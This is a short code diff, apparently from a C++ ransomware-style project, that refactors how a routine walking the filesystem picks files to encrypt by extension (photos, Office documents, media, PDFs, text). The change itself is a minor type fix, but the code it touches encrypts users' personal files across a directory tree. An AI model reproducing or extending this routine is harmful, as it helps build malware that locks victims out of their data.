@@ -1,5 +1,6 @@
 #include <cstdlib>
 #include <cstring>
+#include <string>
 
 extern "C" {
 #include <ftw.h>
@@ -11,7 +12,7 @@ extern "C" {
 
 #include "encrypt.h"
 
-char *const extensions[] = {".jpg", ".gif", ".jpeg", ".png", ".doc", ".docx", ".xls",
+std::string extensions[] = {".jpg", ".gif", ".jpeg", ".png", ".doc", ".docx", ".xls",
       ".xlsx", ".ppt", ".pptx", ".mp3", ".mp4", ".pdf", ".txt"};
 const int extensionsSize = 14;
 const int descriptors = 10;
@@ -72,7 +73,7 @@ void Crypt::shouldEncrypt(const char *name, int flag, struct FTW *path) {
 
 	if (extension) {
 		for (int i = 0; i < extensionsSize; i++) {
-			if (strcmp(extension, extensions[i]) == 0 && flag == FTW_F) {
+			if (extension == extensions[i] && flag == FTW_F) {
 				encryptFile(name);
 				return;
 			}
